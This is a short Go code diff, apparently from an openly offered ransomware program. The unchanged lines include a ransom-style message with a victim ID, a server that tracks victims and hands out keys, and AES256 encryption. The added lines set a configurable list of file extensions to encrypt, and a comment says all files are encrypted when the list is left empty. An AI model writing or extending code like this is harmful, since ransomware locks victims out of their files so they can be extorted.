@@ -30,6 +30,10 @@ Your unique ID is: %s
 const serverPath = "http://localhost:8080"
 const encryptionScheme crypt.EncryptionScheme = crypt.AES256
 
+// If let empty, the program will attempt to encrypt all of the files. It is recommended to add some extensions:
+// for example: extensionsToEncrypt = []string{"txt", "png", "docx"}
+var extensionsToEncrypt = []string{}
+
 // useServer disables the usage of server-sided features like keeping track of victims or
 // giving out the public key. Thus the client needs to use a decrypting program which has
 // a valid key supplied.
